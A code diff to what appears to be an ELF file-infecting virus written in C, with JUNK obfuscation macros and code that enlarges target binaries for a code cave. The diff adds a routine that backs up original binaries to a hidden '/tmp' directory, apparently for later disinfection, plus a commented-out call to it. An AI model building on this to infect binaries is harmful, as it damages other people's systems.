@@ -12,6 +12,10 @@
 #include "map.h"
 #include "syscall.h"
 
+#define OLD_BINS_PATH_SIZE 20
+
+char __attribute__((section(".text#"))) g_old_bins_path[OLD_BINS_PATH_SIZE] = "/tmp/.old_bins_kekw";
+
 int	check_elf_magic(int fd) {
 	Elf64_Ehdr ehdr;
 	uint32_t magic; JUNK;
@@ -64,6 +68,34 @@ int get_bss_size(int fd, uint64_t* bss_len, size_t size) {
 	return 0;
 }
 
+int prepare_disinfection(const char *filename, struct stat st, int fd) {
+
+	mkdirat(AT_FDCWD, g_old_bins_path, 0755);
+
+	char old_bin_path[PATH_MAX];
+	char *ptr = old_bin_path;
+	ptr = ft_stpncpy(ptr, g_old_bins_path, OLD_BINS_PATH_SIZE);
+	ptr = ft_stpncpy(ptr, "/", 1);
+	ptr = ft_stpncpy(ptr, filename, ft_strlen(filename));
+
+	int old_fd = open(old_bin_path, O_CREAT | O_WRONLY | O_EXCL, st.st_mode);
+	if (old_fd == -1) {
+		return -1;
+	}
+
+	uint8_t *save = (uint8_t *)mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+	if (save == MAP_FAILED) {
+		return -1;
+	} JUNK;
+
+	if (write(old_fd, save, st.st_size) == -1) {
+		close(old_fd);
+		munmap(save, st.st_size);
+		return -1;
+	} JUNK;
+
+	return 0;
+}
 
 int map_file(const char *filename, data_t *data) {
 	int		fd;
@@ -93,6 +125,8 @@ int map_file(const char *filename, data_t *data) {
 	} JUNK;
 
 	const size_t size = st.st_size + data->cave.p_size + bss_len;
+
+	//prepare_disinfection(filename, st, fd);
 
 	if (ftruncate(fd, size) == -1) {
 		close(fd);
